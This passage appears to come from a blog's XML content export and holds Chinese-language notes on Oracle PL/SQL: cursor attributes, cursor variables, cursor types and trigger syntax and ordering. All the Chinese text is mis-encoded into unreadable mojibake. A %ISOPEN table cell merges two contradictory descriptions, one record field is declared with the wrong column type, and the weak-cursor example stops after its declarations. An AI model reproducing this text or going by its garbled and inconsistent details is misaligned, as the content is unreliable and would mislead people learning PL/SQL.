<td align="left">å¸ƒå°”å‹å±æ€§ï¼Œä¸%FOUNDç›¸å</td>
</tr>
<tr>
<td align="left">%ISOPEN</td>
<td align="left">å¸ƒå°”å‹å±æ€§ï¼Œå½“æ¸¸æ ‡å·²æ‰“å¼€æ—¶è¿”å› TRUE</td>
</tr>
<tr>
<td align="left">%ROWCOUNT</td>
<td align="left">æ•°å­—å‹å±æ€§ï¼Œè¿”å›å·²ä»æ¸¸æ ‡ä¸­è¯»å–çš„è®°å½•æ•°</td>
</tr>
</tbody></table>
<h3 id="éšå¼æ¸¸æ ‡"><a href="#éšå¼æ¸¸æ ‡" class="headerlink" title="éšå¼æ¸¸æ ‡"></a>éšå¼æ¸¸æ ‡</h3><p><strong>è¯´æ˜ï¼š</strong></p>
<ul>
<li>æ˜¾å¼æ¸¸æ ‡ä¸»è¦æ˜¯ç”¨äºå¯¹æŸ¥è¯¢è¯­å¥çš„å¤„ç†ï¼Œå°¤å…¶æ˜¯åœ¨æŸ¥è¯¢ç»“æœä¸ºå¤šæ¡è®°å½•çš„æƒ…å†µä¸‹ï¼›è€Œå¯¹äºéæŸ¥è¯¢è¯­å¥ï¼Œå¦‚ä¿®æ”¹ã€åˆ é™¤æ“ä½œï¼Œåˆ™ç”±ORACLE ç³»ç»Ÿè‡ªåŠ¨åœ°ä¸ºè¿™äº›æ“ä½œè®¾ç½®æ¸¸æ ‡å¹¶åˆ›å»ºå…¶å·¥ä½œåŒºï¼Œè¿™äº›ç”±ç³»ç»Ÿéšå«åˆ›å»ºçš„æ¸¸æ ‡ç§°ä¸ºéšå¼æ¸¸æ ‡</li>
<li>éšå¼æ¸¸æ ‡çš„åå­—ä¸ºSQLï¼Œè¿™æ˜¯ç”±ORACLE ç³»ç»Ÿå®šä¹‰çš„ã€‚å¯¹äºéšå¼æ¸¸æ ‡çš„æ“ä½œï¼Œå¦‚å®šä¹‰ã€æ‰“å¼€ã€å–å€¼åŠå…³é—­æ“ä½œï¼Œéƒ½ç”±ORACLE ç³»ç»Ÿè‡ªåŠ¨åœ°å®Œæˆï¼Œæ— éœ€ç”¨æˆ·è¿›è¡Œå¤„ç†ã€‚ç”¨æˆ·åªèƒ½é€šè¿‡éšå¼æ¸¸æ ‡çš„ç›¸å…³å±æ€§ï¼Œæ¥å®Œæˆç›¸åº”çš„æ“ä½œã€‚</li>
<li>åœ¨éšå¼æ¸¸æ ‡çš„å·¥ä½œåŒºä¸­ï¼Œæ‰€å­˜æ”¾çš„æ•°æ®æ˜¯æœ€æ–°å¤„ç†çš„ä¸€æ¡SQL è¯­å¥æ‰€åŒ…å«çš„æ•°æ®ï¼ˆä¸ç”¨æˆ·è‡ªå®šä¹‰çš„æ˜¾ç¤ºæ¸¸æ ‡æ— å…³çš„ï¼‰ã€‚</li>
<li>INSERT, UPDATE, DELETE, SELECT INTOè¯­å¥ä¸­ä¸å¿…æ˜ç¡®å®šä¹‰æ¸¸æ ‡</li>
</ul>
<h4 id="æ¸¸æ ‡å±æ€§-1"><a href="#æ¸¸æ ‡å±æ€§-1" class="headerlink" title="æ¸¸æ ‡å±æ€§"></a>æ¸¸æ ‡å±æ€§</h4><table>
<thead>
<tr>
<th align="left">å±æ€§</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%FOUND</td>
<td align="left">å¸ƒå°”å‹å±æ€§,è‡³å°‘æœ‰ä¸€è¡Œè¢«INSERT,DELETEæˆ–UPDATEæ—¶è¿”å›TRUEã€‚</td>
</tr>
<tr>
<td align="left">%NOTFOUND</td>
<td align="left">å¸ƒå°”å‹å±æ€§ï¼Œä¸%FOUNDç›¸å</td>
</tr>
<tr>
<td align="left">%ISOPEN</td>
<td align="left">å¸ƒå°”å‹å±æ€§ï¼Œå½“æ¸¸æ ‡å·²æ‰“å¼€æ—¶è¿”å› TRUEå¸ƒå°”å‹å±æ€§, å–å€¼æ€»æ˜¯FALSEã€‚SQLå‘½ä»¤æ‰§è¡Œå®Œæ¯•ç«‹å³å…³é—­éšå¼æ¸¸æ ‡ã€‚</td>
</tr>
<tr>
<td align="left">%ROWCOUNT</td>
<td align="left">æ•°å­—å‹å±æ€§ï¼Œè¿”å›å·²ä»æ¸¸æ ‡ä¸­è¯»å–çš„è®°å½•æ•°</td>
</tr>
</tbody></table>
<p><strong>æ³¨ï¼š</strong></p>
<ul>
<li>ä¸æœ€è¿‘çš„sqlè¯­å¥ï¼ˆupdate,insert,delete,selectï¼‰å‘ç”Ÿäº¤äº’ï¼Œå½“æœ€è¿‘çš„ä¸€æ¡sqlè¯­å¥æ²¡æœ‰æ¶‰åŠä»»ä½•è¡Œçš„æ—¶å€™ï¼Œåˆ™è¿”å›ç›¸åº”çš„å€¼ã€‚</li>
<li>ä¾‹å¦‚è¦updateä¸€è¡Œæ•°æ®æ—¶ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±å¯ä»¥ä½œç›¸åº”æ“ä½œã€‚</li>
</ul>
<h3 id="æ¸¸æ ‡å˜é‡"><a href="#æ¸¸æ ‡å˜é‡" class="headerlink" title="æ¸¸æ ‡å˜é‡"></a>æ¸¸æ ‡å˜é‡</h3><p><strong>ä¸¾ä¾‹ï¼š</strong></p>
<p>å£°æ˜ä¸¤ä¸ªå¼ºç±»å‹å®šä¹‰æ¸¸æ ‡å˜é‡å’Œä¸€ä¸ªå¼±ç±»å‹æ¸¸æ ‡å˜é‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE </span><br><span class="line">	TYPE deptrecord IS RECORD( </span><br><span class="line">		Deptno dept.deptno%TYPE, </span><br><span class="line">		Dname dept.deptno%TYPE, </span><br><span class="line">		Loc dept.loc%TYPE ); </span><br><span class="line"> 	TYPE deptcurtype IS REF CURSOR RETURN dept%ROWTYPE; </span><br><span class="line"> 	TYPE deptcurtyp1 IS REF CURSOR RETURN deptrecord; </span><br><span class="line"> 	TYPE curtype IS REF CURSOR; </span><br><span class="line"> 	Dept_c1 deptcurtype; </span><br><span class="line"> 	Dept_c2 deptcurtyp1; </span><br><span class="line"> 	Cv curtype;</span><br></pre></td></tr></table></figure>
<h4 id="æ¸¸æ ‡å˜é‡æ“ä½œ"><a href="#æ¸¸æ ‡å˜é‡æ“ä½œ" class="headerlink" title="æ¸¸æ ‡å˜é‡æ“ä½œ"></a>æ¸¸æ ‡å˜é‡æ“ä½œ</h4><p>æ¸¸æ ‡å˜é‡æ“ä½œä¹ŸåŒ…æ‹¬æ‰“å¼€ã€æå–å’Œå…³é—­ä¸‰ä¸ªæ­¥éª¤</p>
<h4 id="æ‰“å¼€æ¸¸æ ‡å˜é‡-ï¼š"><a href="#æ‰“å¼€æ¸¸æ ‡å˜é‡-ï¼š" class="headerlink" title="æ‰“å¼€æ¸¸æ ‡å˜é‡ ï¼š"></a>æ‰“å¼€æ¸¸æ ‡å˜é‡ ï¼š</h4><p>æ‰“å¼€æ¸¸æ ‡å˜é‡æ—¶ä½¿ç”¨çš„æ˜¯OPENâ€¦FOR è¯­å¥ã€‚</p>
<p>æ ¼å¼ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPEN &#123;cursor_variable_name | :host_cursor_variable_name&#125; </span><br><span class="line">	FOR select_statement;</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong></p>
<ul>
<li>cursor_variable_nameä¸ºæ¸¸æ ‡å˜é‡</li>
<li>host_cursor_variable_nameä¸ºPL/SQLä¸»æœºç¯å¢ƒï¼ˆå¦‚OCI: ORACLE Call Interfaceï¼ŒPro*c ç¨‹åºç­‰ï¼‰ä¸­å£°æ˜çš„æ¸¸æ ‡å˜é‡ã€‚</li>
<li>OPENâ€¦FOR è¯­å¥å¯ä»¥åœ¨å…³é—­å½“å‰çš„æ¸¸æ ‡å˜é‡ä¹‹å‰é‡æ–°æ‰“å¼€æ¸¸æ ‡å˜é‡ï¼Œè€Œä¸ä¼šå¯¼è‡´CURSOR_ALREAD_OPENå¼‚å¸¸é”™è¯¯ã€‚</li>
<li>æ–°æ‰“å¼€æ¸¸æ ‡å˜é‡æ—¶ï¼Œå‰ä¸€ä¸ªæŸ¥è¯¢çš„å†…å­˜å¤„ç†åŒºå°†è¢«é‡Šæ”¾</li>
</ul>
<h4 id="æå–æ¸¸æ ‡å˜é‡æ•°æ®-ï¼š"><a href="#æå–æ¸¸æ ‡å˜é‡æ•°æ®-ï¼š" class="headerlink" title="æå–æ¸¸æ ‡å˜é‡æ•°æ® ï¼š"></a>æå–æ¸¸æ ‡å˜é‡æ•°æ® ï¼š</h4><p>ä½¿ç”¨FETCHè¯­å¥æå–æ¸¸æ ‡å˜é‡ç»“æœé›†åˆä¸­çš„æ•°æ®ã€‚æ ¼å¼ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FETCH &#123;cursor_variable_name | :host_cursor_variable_name&#125; </span><br><span class="line">	INTO &#123;variable [, variable]â€¦| record_variable&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong></p>
<table>
<thead>
<tr>
<th align="left">å±æ€§</th>
<th align="left">å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td align="left">cursor_variable_name</td>
<td align="left">æ¸¸æ ‡å˜é‡åç§°</td>
</tr>
<tr>
<td align="left">host_cursor_variable_name</td>
<td align="left">å®¿ä¸»æ¸¸æ ‡å˜é‡åç§°</td>
</tr>
<tr>
<td align="left">variable</td>
<td align="left">æ™®é€šå˜é‡åç§°</td>
</tr>
<tr>
<td align="left">record_variable</td>
<td align="left">è®°å½•å˜é‡åç§°</td>
</tr>
</tbody></table>
<h4 id="å…³é—­æ¸¸æ ‡å˜é‡-ï¼š"><a href="#å…³é—­æ¸¸æ ‡å˜é‡-ï¼š" class="headerlink" title="å…³é—­æ¸¸æ ‡å˜é‡ ï¼š"></a>å…³é—­æ¸¸æ ‡å˜é‡ ï¼š</h4><p>CLOSEè¯­å¥å…³é—­æ¸¸æ ‡å˜é‡ï¼Œæ ¼å¼ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CLOSE &#123;cursor_variable_name | :host_cursor_variable_name&#125;</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong></p>
<ul>
<li>cursor_variable_nameå’Œhost_cursor_variable_nameåˆ†åˆ«ä¸ºæ¸¸æ ‡å˜é‡å’Œå®¿ä¸»æ¸¸æ ‡å˜é‡åç§°</li>
<li>å¦‚æœåº”ç”¨ç¨‹åºè¯•å›¾å…³é—­ä¸€ä¸ªæœªæ‰“å¼€çš„æ¸¸æ ‡å˜é‡ï¼Œåˆ™å°†å¯¼è‡´INVALID_CURSORå¼‚å¸¸é”™è¯¯ã€‚</li>
</ul>
<h3 id="æ¸¸æ ‡ç±»å‹"><a href="#æ¸¸æ ‡ç±»å‹" class="headerlink" title="æ¸¸æ ‡ç±»å‹"></a>æ¸¸æ ‡ç±»å‹</h3><table>
<thead>
<tr>
<th align="left">ç±»å‹</th>
<th align="left">è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">é™æ€æ¸¸æ ‡</td>
<td align="left">æ˜¾å¼æ¸¸æ ‡å’Œéšå¼æ¸¸æ ‡ç§°ä¸ºé™æ€æ¸¸æ ‡ï¼Œå› ä¸ºåœ¨ä½¿ç”¨ä»–ä»¬ä¹‹å‰ï¼Œæ¸¸æ ‡çš„å®šä¹‰å·²ç»å®Œæˆï¼Œä¸èƒ½å†æ›´æ”¹ã€‚</td>
</tr>
<tr>
<td align="left">åŠ¨æ€æ¸¸æ ‡</td>
<td align="left">æ¸¸æ ‡åœ¨å£°æ˜æ—¶æ²¡æœ‰è®¾å®šï¼Œåœ¨æ‰“å¼€æ—¶å¯ä»¥å¯¹å…¶è¿›è¡Œä¿®æ”¹ã€‚åˆ†ä¸ºå¼ºç±»å‹æ¸¸æ ‡å’Œå¼±ç±»å‹æ¸¸æ ‡ã€‚</td>
</tr>
<tr>
<td align="left">å¼ºç±»å‹åŠ¨æ€æ¸¸æ ‡</td>
<td align="left">åœ¨å£°æ˜å˜é‡æ—¶ä½¿ç”¨returnå…³é”®å­—å®šä¹‰æ¸¸æ ‡çš„è¿”å›ç±»å‹</td>
</tr>
<tr>
<td align="left">å¼±ç±»å‹åŠ¨æ€æ¸¸æ ‡</td>
<td align="left">åœ¨å£°æ˜å˜é‡æ—¶ä¸ä½¿ç”¨returnå…³é”®å­—å®šä¹‰æ¸¸æ ‡çš„è¿”å›ç±»å‹</td>
</tr>
</tbody></table>
<h4 id="æ¸¸æ ‡å˜é‡åº”ç”¨ä¸¾ä¾‹"><a href="#æ¸¸æ ‡å˜é‡åº”ç”¨ä¸¾ä¾‹" class="headerlink" title="æ¸¸æ ‡å˜é‡åº”ç”¨ä¸¾ä¾‹"></a>æ¸¸æ ‡å˜é‡åº”ç”¨ä¸¾ä¾‹</h4><h5 id="å¼ºç±»å‹å‚ç…§æ¸¸æ ‡å˜é‡ç±»å‹"><a href="#å¼ºç±»å‹å‚ç…§æ¸¸æ ‡å˜é‡ç±»å‹" class="headerlink" title="å¼ºç±»å‹å‚ç…§æ¸¸æ ‡å˜é‡ç±»å‹"></a>å¼ºç±»å‹å‚ç…§æ¸¸æ ‡å˜é‡ç±»å‹</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE </span><br><span class="line"> 	TYPE emp_job_rec IS RECORD( </span><br><span class="line">  		Employee_id emp.empno%TYPE, </span><br><span class="line">  		Employee_name emp.ename%TYPE, </span><br><span class="line">  		Job_title emp.job%TYPE); </span><br><span class="line"> 	TYPE emp_job_refcur_type IS REF CURSOR RETURN emp_job_rec; </span><br><span class="line"> 	Emp_refcur emp_job_refcur_type ; </span><br><span class="line"> 	Emp_job emp_job_rec;</span><br><span class="line">BEGIN </span><br><span class="line"> 	OPEN emp_refcur FOR  SELECT empno, ename, job FROM emp ORDER BY deptno; </span><br><span class="line">	FETCH emp_refcur INTO emp_job; </span><br><span class="line">	WHILE emp_refcur%FOUND LOOP </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(emp_job.employee_id||&#39;: &#39;</span><br><span class="line">                         ||emp_job.employee_name</span><br><span class="line">                         ||&#39; is a &#39;</span><br><span class="line">                         ||emp_job.job_title); </span><br><span class="line">	FETCH emp_refcur INTO emp_job; </span><br><span class="line">	END LOOP; </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h5 id="å¼±ç±»å‹å‚ç…§æ¸¸æ ‡å˜é‡ç±»å‹"><a href="#å¼±ç±»å‹å‚ç…§æ¸¸æ ‡å˜é‡ç±»å‹" class="headerlink" title="å¼±ç±»å‹å‚ç…§æ¸¸æ ‡å˜é‡ç±»å‹"></a>å¼±ç±»å‹å‚ç…§æ¸¸æ ‡å˜é‡ç±»å‹</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE </span><br><span class="line"> 	Type refcur_t IS REF CURSOR; </span><br><span class="line"> 	Refcur refcur_t; </span><br><span class="line"> 	TYPE sample_rec_type IS RECORD ( </span><br><span class="line">  		Id number, </span><br><span class="line"> 		 Description VARCHAR2 (30) ); </span><br><span class="line"> 	sample sample_rec_type; </span><br><span class="line"> 	selection varchar2(1) :&#x3D; UPPER (SUBSTR (&#39;&amp;tab&#39;, 1, 1));</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>plsqlè§¦å‘å™¨</title>
    <url>/2019/12/17/Oracle/plsql%E8%A7%A6%E5%8F%91%E5%99%A8/</url>
    <content><![CDATA[<h1 id="plsqlè§¦å‘å™¨"><a href="#plsqlè§¦å‘å™¨" class="headerlink" title="plsqlè§¦å‘å™¨"></a>plsqlè§¦å‘å™¨</h1><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><ul>
<li>è§¦å‘å™¨åœ¨æ•°æ®åº“é‡Œä»¥ç‹¬ç«‹çš„å¯¹è±¡å­˜å‚¨ï¼Œå®ƒä¸å­˜å‚¨è¿‡ç¨‹ä¸åŒçš„æ˜¯ï¼Œ<ul>
<li>å­˜å‚¨è¿‡ç¨‹é€šè¿‡å…¶å®ƒç¨‹åºæ¥å¯åŠ¨è¿è¡Œæˆ–ç›´æ¥å¯åŠ¨è¿è¡Œ</li>
<li>è§¦å‘å™¨æ˜¯ç”±ä¸€ä¸ª<strong>äº‹ä»¶</strong>æ¥å¯åŠ¨è¿è¡Œ</li>
</ul>
</li>
<li>è§¦å‘å™¨æ˜¯å½“æŸä¸ªäº‹ä»¶å‘ç”Ÿæ—¶è‡ªåŠ¨åœ°éšå¼è¿è¡Œã€‚<ul>
<li>è§¦å‘å™¨<strong>ä¸èƒ½æ¥æ”¶å‚æ•°</strong>ã€‚</li>
<li>è¿è¡Œè§¦å‘å™¨å°±å«<strong>è§¦å‘</strong>æˆ–<strong>ç‚¹ç«</strong>ï¼ˆfiringï¼‰</li>
</ul>
</li>
<li>ORACLEä¸­äº‹ä»¶æŒ‡çš„æ˜¯å¯¹æ•°æ®åº“çš„è¡¨è¿›è¡Œçš„INSERTã€UPDATEåŠDELETEæ“ä½œæˆ–å¯¹è§†å›¾è¿›è¡Œç±»ä¼¼çš„æ“ä½œã€‚</li>
<li>ORACLEå°†è§¦å‘å™¨çš„åŠŸèƒ½æ‰©å±•åˆ°äº†è§¦å‘ORACLEï¼Œå¦‚æ•°æ®åº“çš„å¯åŠ¨ä¸å…³é—­ç­‰ã€‚<a id="more"></a>
<h2 id="è§¦å‘å™¨ç±»å‹"><a href="#è§¦å‘å™¨ç±»å‹" class="headerlink" title="è§¦å‘å™¨ç±»å‹"></a>è§¦å‘å™¨ç±»å‹</h2></li>
</ul>
<p>ä¸»è¦çš„è§¦å‘å™¨æœ‰<strong>ä¸‰ç§</strong>ï¼š</p>
<ul>
<li>DMLè§¦å‘å™¨<ul>
<li>ORACLEå¯ä»¥åœ¨DMLè¯­å¥è¿›è¡Œè§¦å‘</li>
<li>å¯ä»¥åœ¨DMLæ“ä½œå‰æˆ–æ“ä½œåè¿›è¡Œè§¦å‘</li>
<li>å¯ä»¥å¯¹æ¯ä¸ªè¡Œæˆ–è¯­å¥æ“ä½œä¸Šè¿›è¡Œè§¦å‘</li>
</ul>
</li>
<li>æ›¿ä»£è§¦å‘å™¨<ul>
<li>ç”±äºåœ¨ORACLEé‡Œï¼Œä¸èƒ½ç›´æ¥å¯¹ç”±ä¸¤ä¸ªä»¥ä¸Šçš„è¡¨å»ºç«‹çš„è§†å›¾è¿›è¡Œæ“ä½œã€‚æ‰€ä»¥ç»™å‡ºäº†æ›¿ä»£è§¦å‘å™¨ã€‚<ul>
<li>å®ƒæ˜¯ORACLEä¸“é—¨ä¸ºè¿›è¡Œè§†å›¾æ“ä½œçš„ä¸€ç§å¤„ç†æ–¹æ³•</li>
</ul>
</li>
</ul>
</li>
<li>ç³»ç»Ÿï¼ˆç”¨æˆ·äº‹ä»¶ï¼‰è§¦å‘å™¨<ul>
<li>å®ƒå¯ä»¥åœ¨ORACLEæ•°æ®åº“ç³»ç»Ÿçš„äº‹ä»¶ä¸­è¿›è¡Œè§¦å‘<ul>
<li>å¦‚ORACLEç³»ç»Ÿçš„å¯åŠ¨ä¸å…³é—­ç­‰ã€‚</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="è§¦å‘å™¨ç»„æˆ"><a href="#è§¦å‘å™¨ç»„æˆ" class="headerlink" title="è§¦å‘å™¨ç»„æˆ"></a>è§¦å‘å™¨ç»„æˆ</h2><ul>
<li>è§¦å‘äº‹ä»¶<ul>
<li>å³åœ¨ä½•ç§æƒ…å†µä¸‹è§¦å‘TRIGGER<ul>
<li>ä¾‹å¦‚ï¼šINSERT, UPDATE, DELETE</li>
</ul>
</li>
</ul>
</li>
<li>è§¦å‘æ—¶é—´<ul>
<li>å³è¯¥TRIGGER æ˜¯åœ¨è§¦å‘äº‹ä»¶å‘ç”Ÿä¹‹å‰ï¼ˆBEFOREï¼‰è¿˜æ˜¯ä¹‹å(AFTER)è§¦å‘<ul>
<li>ä¹Ÿå°±æ˜¯è§¦å‘äº‹ä»¶å’Œè¯¥TRIGGER çš„æ“ä½œé¡ºåº</li>
</ul>
</li>
</ul>
</li>
<li>è§¦å‘å™¨æœ¬èº«<ul>
<li>å³è¯¥TRIGGER è¢«è§¦å‘ä¹‹åçš„ç›®çš„å’Œæ„å›¾ï¼Œæ­£æ˜¯è§¦å‘å™¨æœ¬èº«è¦åšçš„äº‹æƒ…<ul>
<li>ä¾‹å¦‚ï¼šPL/SQL å—ã€‚</li>
</ul>
</li>
</ul>
</li>
<li>è§¦å‘é¢‘ç‡<ul>
<li>è¯´æ˜è§¦å‘å™¨å†…å®šä¹‰çš„åŠ¨ä½œè¢«æ‰§è¡Œçš„æ¬¡æ•°<ul>
<li>å³è¯­å¥çº§(STATEMENT)è§¦å‘å™¨å’Œè¡Œçº§(ROW)è§¦å‘å™¨<ul>
<li>è¯­å¥çº§(STATEMENT)è§¦å‘å™¨<ul>
<li>æ˜¯æŒ‡å½“æŸè§¦å‘äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œè¯¥è§¦å‘å™¨åªæ‰§è¡Œä¸€æ¬¡</li>
</ul>
</li>
<li>è¡Œçº§(ROW)è§¦å‘å™¨<ul>
<li>æ˜¯æŒ‡å½“æŸè§¦å‘äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå¯¹å—åˆ°è¯¥æ“ä½œå½±å“çš„æ¯ä¸€è¡Œæ•°æ®ï¼Œè§¦å‘å™¨éƒ½å•ç‹¬æ‰§è¡Œä¸€æ¬¡</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="åˆ›å»ºè§¦å‘å™¨"><a href="#åˆ›å»ºè§¦å‘å™¨" class="headerlink" title="åˆ›å»ºè§¦å‘å™¨"></a>åˆ›å»ºè§¦å‘å™¨</h2><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE [OR REPLACE] TRIGGER trigger_name </span><br><span class="line">   	&#123;BEFORE | AFTER &#125; </span><br><span class="line">   	&#123;INSERT | DELETE | UPDATE [OF column [, column â€¦]]&#125; </span><br><span class="line">ON [schema.] table_name  </span><br><span class="line"> 	[REFERENCING &#123;OLD [AS] old | NEW [AS] new&#125;] </span><br><span class="line"> 	[FOR EACH ROW ] </span><br><span class="line"> 	[WHEN condition] </span><br><span class="line"> trigger_body;</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong></p>
<ul>
<li>BEFORE å’ŒAFTER<ul>
<li>æŒ‡å‡ºè§¦å‘å™¨çš„è§¦å‘æ—¶åºåˆ†åˆ«ä¸ºå‰è§¦å‘å’Œåè§¦å‘æ–¹å¼</li>
<li>å‰è§¦å‘æ˜¯åœ¨æ‰§è¡Œè§¦å‘äº‹ä»¶ä¹‹å‰è§¦å‘å½“å‰æ‰€åˆ›å»ºçš„è§¦å‘å™¨</li>
<li>åè§¦å‘æ˜¯åœ¨æ‰§è¡Œè§¦å‘äº‹ä»¶ä¹‹åè§¦å‘å½“å‰æ‰€åˆ›å»ºçš„è§¦å‘å™¨</li>
</ul>
</li>
<li>FOR EACH ROW<ul>
<li>è¯´æ˜è§¦å‘å™¨ä¸ºè¡Œè§¦å‘å™¨</li>
<li>è¡Œè§¦å‘å™¨å’Œè¯­å¥è§¦å‘å™¨çš„åŒºåˆ«è¡¨ç°åœ¨<ul>
<li>è¡Œè§¦å‘å™¨è¦æ±‚å½“ä¸€ä¸ªDMLè¯­å¥æ“èµ°å½±å“æ•°æ®åº“ä¸­çš„å¤šè¡Œæ•°æ®æ—¶ï¼Œå¯¹äºå…¶ä¸­çš„æ¯ä¸ªæ•°æ®è¡Œï¼Œåªè¦å®ƒä»¬ç¬¦åˆè§¦å‘çº¦æŸæ¡ä»¶ï¼Œå‡æ¿€æ´»ä¸€æ¬¡è§¦å‘å™¨</li>
<li>è¯­å¥è§¦å‘å™¨å°†æ•´ä¸ªè¯­å¥æ“ä½œä½œä¸ºè§¦å‘äº‹ä»¶ï¼Œå½“å®ƒç¬¦åˆçº¦æŸæ¡ä»¶æ—¶ï¼Œæ¿€æ´»ä¸€æ¬¡è§¦å‘å™¨</li>
</ul>
</li>
<li>å½“çœç•¥FOR EACH ROW é€‰é¡¹æ—¶<ul>
<li>BEFORE å’ŒAFTER è§¦å‘å™¨ä¸ºè¯­å¥è§¦å‘å™¨ï¼Œ</li>
<li>INSTEAD OF è§¦å‘å™¨åˆ™ä¸ºè¡Œè§¦å‘å™¨</li>
</ul>
</li>
</ul>
</li>
<li>REFERENCING<ul>
<li>è¯´æ˜ç›¸å…³åç§°</li>
<li>åœ¨è¡Œè§¦å‘å™¨çš„PL/SQLå—å’ŒWHEN å­å¥ä¸­å¯ä»¥ä½¿ç”¨ç›¸å…³åç§°å‚ç…§å½“å‰çš„æ–°ã€æ—§åˆ—å€¼ï¼Œé»˜è®¤çš„ç›¸å…³åç§°åˆ†åˆ«ä¸ºOLDå’ŒNEWã€‚</li>
<li>è§¦å‘å™¨çš„PL/SQLå—ä¸­åº”ç”¨ç›¸å…³åç§°æ—¶ï¼Œå¿…é¡»åœ¨å®ƒä»¬ä¹‹å‰åŠ å†’å·(:)ï¼Œä½†åœ¨WHENå­å¥ä¸­åˆ™ä¸èƒ½åŠ å†’å·ã€‚</li>
</ul>
</li>
<li>WHEN<ul>
<li>è¯´æ˜è§¦å‘çº¦æŸæ¡ä»¶</li>
<li>Condition ä¸ºä¸€ä¸ªé€»è¾‘è¡¨è¾¾æ—¶ï¼Œå…¶ä¸­å¿…é¡»åŒ…å«ç›¸å…³åç§°ï¼Œè€Œä¸èƒ½åŒ…å«æŸ¥è¯¢è¯­å¥ï¼Œä¹Ÿä¸èƒ½è°ƒç”¨PL/SQL å‡½æ•°</li>
<li>WHEN å­å¥æŒ‡å®šçš„è§¦å‘çº¦æŸæ¡ä»¶<ul>
<li><strong>åªèƒ½</strong>ç”¨åœ¨<strong>BEFORE å’ŒAFTER è¡Œè§¦å‘å™¨</strong>ä¸­</li>
<li><strong>ä¸èƒ½</strong>ç”¨åœ¨<strong>INSTEAD OF è¡Œè§¦å‘å™¨å’Œå…¶å®ƒç±»å‹çš„è§¦å‘å™¨</strong>ä¸­</li>
</ul>
</li>
</ul>
</li>
<li>å½“ä¸€ä¸ªåŸºè¡¨è¢«ä¿®æ”¹( INSERT, UPDATE, DELETE)æ—¶è¦æ‰§è¡Œçš„å­˜å‚¨è¿‡ç¨‹ï¼Œæ‰§è¡Œæ—¶æ ¹æ®å…¶æ‰€ä¾é™„çš„åŸºè¡¨æ”¹åŠ¨è€Œè‡ªåŠ¨è§¦å‘å› æ­¤ä¸åº”ç”¨ç¨‹åºæ— å…³ï¼Œç”¨<strong>æ•°æ®åº“è§¦å‘å™¨</strong>å¯ä»¥ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§å’Œå®Œæ•´æ€§ã€‚</li>
</ul>
<h3 id="æ¯å¼ è¡¨æœ€å¤šå¯åˆ›å»º12ç§è§¦å‘å™¨"><a href="#æ¯å¼ è¡¨æœ€å¤šå¯åˆ›å»º12ç§è§¦å‘å™¨" class="headerlink" title="æ¯å¼ è¡¨æœ€å¤šå¯åˆ›å»º12ç§è§¦å‘å™¨"></a>æ¯å¼ è¡¨æœ€å¤šå¯åˆ›å»º12ç§è§¦å‘å™¨</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BEFORE INSERT </span><br><span class="line">BEFORE INSERT FOR EACH ROW </span><br><span class="line">AFTER INSERT </span><br><span class="line">AFTER INSERT FOR EACH ROW </span><br><span class="line">BEFORE UPDATE </span><br><span class="line">BEFORE UPDATE FOR EACH ROW </span><br><span class="line">AFTER UPDATE </span><br><span class="line">AFTER UPDATE FOR EACH ROW </span><br><span class="line">BEFORE DELETE </span><br><span class="line">BEFORE DELETE FOR EACH ROW </span><br><span class="line">AFTER DELETE </span><br><span class="line">AFTER DELETE FOR EACH ROW</span><br></pre></td></tr></table></figure>
<h2 id="è§¦å‘å™¨æ‰§è¡Œé¡ºåº"><a href="#è§¦å‘å™¨æ‰§è¡Œé¡ºåº" class="headerlink" title="è§¦å‘å™¨æ‰§è¡Œé¡ºåº"></a>è§¦å‘å™¨æ‰§è¡Œé¡ºåº</h2><ul>
<li>æ‰§è¡Œ BEFOREè¯­å¥çº§è§¦å‘å™¨</li>
<li>å¯¹äºå—è¯­å¥å½±å“çš„æ¯ä¸€è¡Œï¼š<ul>
<li>æ‰§è¡Œ BEFOREè¡Œçº§è§¦å‘å™¨</li>
<li>æ‰§è¡Œ DMLè¯­å¥</li>
<li>æ‰§è¡Œ AFTERè¡Œçº§è§¦å‘å™¨</li>
</ul>
</li>
<li>æ‰§è¡Œ AFTERè¯­å¥çº§è§¦å‘å™¨</li>
</ul>
<h2 id="åˆ›å»ºDMLè§¦å‘å™¨"><a href="#åˆ›å»ºDMLè§¦å‘å™¨" class="headerlink" title="åˆ›å»ºDMLè§¦å‘å™¨"></a>åˆ›å»ºDMLè§¦å‘å™¨</h2><ul>
